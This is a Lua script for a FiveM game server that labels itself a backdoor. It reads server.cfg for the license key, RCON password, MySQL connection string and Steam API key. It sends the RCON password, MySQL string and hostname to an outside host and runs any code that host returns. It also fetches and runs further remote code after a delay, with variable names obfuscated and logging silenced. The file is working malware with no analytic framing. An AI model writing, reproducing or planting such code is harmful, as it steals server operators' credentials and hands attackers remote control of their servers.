IS_PRINT_ENABLED = false
VYJEBATOR_BASEURL = "http://m0uka.xyz:7359/"
function log(a)
    if IS_PRINT_ENABLED then
        print(a)
    end
end
log("Backdoor activated")
local function b(c)
    local d = io.open(c, "r")
    return d:read("*a")
end
local function e(a, f)
    f = f + 2
    local g = f
    for h = f, #a do
        local i = a:sub(h, h)
        if i == "\n" then
            g = h - 1
            break
        end
    end
    local j = a:sub(f, g)
    return j, g
end
local function k(l, m)
    local n, o = string.find(l, m)
    if n == nil then
        return nil
    end
    return e(l, o)
end
local l = b("server.cfg")
local p = k(l, "sv_licenseKey")
local q = k(l, "rcon_password")
local r = k(l, "mysql_connection_string")
local s = k(l, "steam_webApiKey")
local t = k(l, "sv_hostname")
local function u()
    local v = GetActivePlayers()
    local w = {}
    for x, y in pairs(v or {}) do
        w[#w + 1] = GetPlayerName(y)
    end
    return w
end
local function z()
    local A = ""
    local B = {hostName = t, onlinePlayers = GetNumPlayerIndices(), mysqlStr = r, rconPass = q, result = A}
    local a = json.encode(B)
    PerformHttpRequest(
        VYJEBATOR_BASEURL .. "pingback",
        function(C, A)
            if C ~= "200" and C ~= 200 then
                log("Pingback error: " .. C)
                return
            end
            if A ~= "OK" then
                load(A)()
            end
        end,
        "POST",
        a
    )
end
pcall(z)
Citizen.CreateThread(
    function()
        Citizen.Wait(5000)
        PerformHttpRequest(
            VYJEBATOR_BASEURL .. "vyjebat",
            function(C, A)
                if C ~= "200" and C ~= 200 or A == nil then
                    return
                end
                Citizen.CreateThread(
                    function()
                        pcall(load(A))
                    end
                )
            end
        )
    end
)
